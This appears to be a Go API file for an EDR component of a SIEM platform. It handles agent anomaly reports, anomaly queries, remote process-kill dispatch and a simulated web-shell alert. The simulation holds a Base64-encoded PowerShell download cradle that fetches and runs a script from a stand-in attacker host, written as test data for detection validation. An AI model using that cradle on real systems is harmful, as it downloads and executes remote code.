package api

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/syslog-platform/logger/internal/models"
)

// handleEndpointAgentBehavior handles behavioral anomaly reports submitted by native agents (Phase N)
func (h *Handler) handleEndpointAgentBehavior(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	var req models.AgentBehaviorSubmission
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid json: " + err.Error()})
		return
	}

	agentUUID := req.AgentUUID
	if agentUUID == "" {
		agentUUID = r.Header.Get("X-Agent-UUID")
	}
	if agentUUID == "" {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "agent_uuid is required"})
		return
	}

	// Resolve agent from PostgreSQL
	agentID, tenantSlug, hostname, ipAddress, _, err := h.pgDB.ResolveAgentByUUID(r.Context(), agentUUID)
	if err != nil {
		writeJSON(w, http.StatusUnauthorized, map[string]string{"error": "agent not found or unenrolled"})
		return
	}

	now := time.Now().UTC()
	// Enrich anomalies with agent context
	for i := range req.Anomalies {
		req.Anomalies[i].AgentID = agentID
		req.Anomalies[i].TenantSlug = tenantSlug
		req.Anomalies[i].AgentHostname = hostname
		req.Anomalies[i].AgentIP = ipAddress
		if req.Anomalies[i].Timestamp.IsZero() {
			req.Anomalies[i].Timestamp = now
		}
		if req.Anomalies[i].CreatedAt.IsZero() {
			req.Anomalies[i].CreatedAt = now
		}
	}

	// 1. Persist behavioral anomalies in PostgreSQL
	if len(req.Anomalies) > 0 {
		if err := h.pgDB.RecordProcessAnomalies(r.Context(), req.Anomalies); err != nil {
			writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "recording anomalies: " + err.Error()})
			return
		}

		// 2. Correlate with SIEM Engine & SOAR Engine
		if h.siemEngine != nil {
			for _, a := range req.Anomalies {
				riskScore := 65
				sevUpper := strings.ToUpper(a.Severity)
				switch sevUpper {
				case "CRITICAL":
					riskScore = 95
				case "HIGH":
					riskScore = 80
				case "MEDIUM":
					riskScore = 60
				default:
					riskScore = 40
				}

				alert := &models.SIEMAlert{
					ID:             uuid.New(),
					RuleID:         a.RuleID,
					RuleName:       fmt.Sprintf("EDR Threat: %s on %s", a.RuleName, hostname),
					Severity:       sevUpper,
					Tenant:         tenantSlug,
					DeviceName:     hostname,
					SourceIP:       ipAddress,
					Category:       "endpoint_edr",
					EventCount:     1,
					FirstSeen:      a.Timestamp,
					LastSeen:       a.Timestamp,
					Status:         "NEW",
					MitreTactic:    a.MitreTactic,
					MitreTechnique: a.MitreTechnique,
					RiskScore:      riskScore,
					Summary:        fmt.Sprintf("Host '%s': %s (PID: %d, Image: %s, Parent: %s, Action: %s)", hostname, a.Details, a.PID, a.ProcessName, a.ParentName, a.ActionTaken),
					CreatedAt:      a.Timestamp,
				}
				h.siemEngine.DispatchDirectAlert(alert)
			}
		}
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"status":   "success",
		"recorded": len(req.Anomalies),
	})
}

// handleEndpointEDRAnomalies lists filtered behavioral anomalies with process tree metadata
func (h *Handler) handleEndpointEDRAnomalies(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	tenant := h.tenantScope(r)
	q := r.URL.Query()

	var agentUUID *uuid.UUID
	if aIDStr := q.Get("agent_id"); aIDStr != "" && aIDStr != "all" {
		if id, err := uuid.Parse(aIDStr); err == nil {
			agentUUID = &id
		}
	}

	severity := q.Get("severity")
	search := q.Get("search")

	limit := 100
	if lStr := q.Get("limit"); lStr != "" {
		if l, err := strconv.Atoi(lStr); err == nil && l > 0 {
			limit = l
		}
	}

	offset := 0
	if oStr := q.Get("offset"); oStr != "" {
		if o, err := strconv.Atoi(oStr); err == nil && o >= 0 {
			offset = o
		}
	}

	anomalies, total, err := h.pgDB.ListProcessAnomalies(r.Context(), tenant, agentUUID, severity, search, limit, offset)
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"anomalies": anomalies,
		"total":     total,
		"limit":     limit,
		"offset":    offset,
	})
}

// handleEndpointEDRAnomalyDetail returns details of a single behavioral anomaly
func (h *Handler) handleEndpointEDRAnomalyDetail(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	idStr := strings.TrimPrefix(r.URL.Path, "/api/v1/endpoint/edr/anomalies/")
	anomalyUUID, err := uuid.Parse(idStr)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid anomaly id"})
		return
	}

	tenant := h.tenantScope(r)
	anomaly, err := h.pgDB.GetProcessAnomaly(r.Context(), tenant, anomalyUUID)
	if err != nil {
		writeJSON(w, http.StatusNotFound, map[string]string{"error": "anomaly not found"})
		return
	}

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"anomaly": anomaly,
	})
}


// handleEndpointEDRStats computes and returns dashboard KPI metrics for Phase N EDR
func (h *Handler) handleEndpointEDRStats(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	tenant := h.tenantScope(r)
	stats, err := h.pgDB.GetEDRStats(r.Context(), tenant)
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}

	writeJSON(w, http.StatusOK, stats)
}

// handleEndpointEDRKill handles analyst 1-click remote process termination dispatch
func (h *Handler) handleEndpointEDRKill(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		AgentID     string `json:"agent_id"`
		PID         int    `json:"pid"`
		ProcessName string `json:"process_name"`
		Force       bool   `json:"force"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid json: " + err.Error()})
		return
	}

	agentUUID, err := uuid.Parse(req.AgentID)
	if err != nil {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid agent_id"})
		return
	}

	username := "admin"
	if s, ok := h.getSession(r); ok && s != nil {
		username = s.Username
	}

	tenant := h.tenantScope(r)
	payload := map[string]interface{}{
		"pid":          req.PID,
		"process_name": req.ProcessName,
		"force":        req.Force,
	}

	task, err := h.pgDB.DispatchActiveResponseTask(r.Context(), tenant, agentUUID, "process_kill", payload, username)
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": err.Error()})
		return
	}

	h.recordAudit(r, "EDR_KILL_PROCESS", fmt.Sprintf("endpoint/edr/kill/%d", req.PID), "DISPATCHED", map[string]interface{}{
		"agent_id":     agentUUID,
		"pid":          req.PID,
		"process_name": req.ProcessName,
		"task_id":      task.ID,
	})

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"status":  "dispatched",
		"task_id": task.ID,
		"message": fmt.Sprintf("Process termination task (PID %d) dispatched to endpoint", req.PID),
	})
}

// handleEndpointEDRSimulate triggers a synthetic LotL / web shell threat event for testing & SIEM validation
func (h *Handler) handleEndpointEDRSimulate(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		return
	}

	tenant := h.tenantScope(r)
	agents, _, err := h.pgDB.ListAgents(r.Context(), tenant, "", "", "", 1, 0)
	if err != nil || len(agents) == 0 {
		writeJSON(w, http.StatusBadRequest, map[string]string{"error": "No enrolled endpoint agent found in tenant to simulate EDR attack on"})
		return
	}

	agent := agents[0]
	now := time.Now().UTC()

	// Create simulated web shell execution scenario
	anomaly := models.EndpointProcessAnomaly{
		ID:                uuid.New(),
		TenantSlug:        agent.TenantSlug,
		AgentID:           agent.ID,
		AgentHostname:     agent.Hostname,
		AgentIP:           agent.IPAddress,
		PID:               8492,
		ProcessName:       "powershell.exe",
		CommandLine:       "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==",
		ParentPID:         4210,
		ParentName:        "w3wp.exe",
		ParentCommandLine: `c:\windows\system32\inetsrv\w3wp.exe -ap "DefaultAppPool" -v "v4.0"`,
		Username:          "IIS APPPOOL\\DefaultAppPool",
		Severity:          "critical",
		RuleID:            "EDR-RULE-WEBSHELL",
		RuleName:          "Web Server Spawned Obfuscated Script Interpreter",
		MitreTactic:       "Persistence",
		MitreTechnique:    "T1505.003",
		ActionTaken:       "audited",
		Details:           fmt.Sprintf("Host '%s': IIS worker process w3wp.exe spawned obfuscated PowerShell download cradle. High confidence web shell intrusion detected.", agent.Hostname),
		Timestamp:         now,
		CreatedAt:         now,
	}

	if err := h.pgDB.RecordProcessAnomalies(r.Context(), []models.EndpointProcessAnomaly{anomaly}); err != nil {
		writeJSON(w, http.StatusInternalServerError, map[string]string{"error": "recording simulated anomaly: " + err.Error()})
		return
	}

	if h.siemEngine != nil {
		alert := &models.SIEMAlert{
			ID:             uuid.New(),
			RuleID:         anomaly.RuleID,
			RuleName:       fmt.Sprintf("EDR Threat: %s on %s", anomaly.RuleName, agent.Hostname),
			Severity:       "CRITICAL",
			Tenant:         tenant,
			DeviceName:     agent.Hostname,
			SourceIP:       agent.IPAddress,
			Category:       "endpoint_edr",
			EventCount:     1,
			FirstSeen:      now,
			LastSeen:       now,
			Status:         "NEW",
			MitreTactic:    anomaly.MitreTactic,
			MitreTechnique: anomaly.MitreTechnique,
			RiskScore:      95,
			Summary:        anomaly.Details,
			CreatedAt:      now,
		}
		h.siemEngine.DispatchDirectAlert(alert)
	}

	h.recordAudit(r, "EDR_SIMULATE_ATTACK", "endpoint/edr/simulate", "SUCCESS", map[string]interface{}{
		"agent_id": agent.ID,
		"hostname": agent.Hostname,
		"rule_id":  anomaly.RuleID,
	})

	writeJSON(w, http.StatusOK, map[string]interface{}{
		"status":  "success",
		"message": fmt.Sprintf("Simulated Web Shell & LOLBin attack injected successfully for agent '%s'", agent.Hostname),
		"anomaly": anomaly,
	})
}
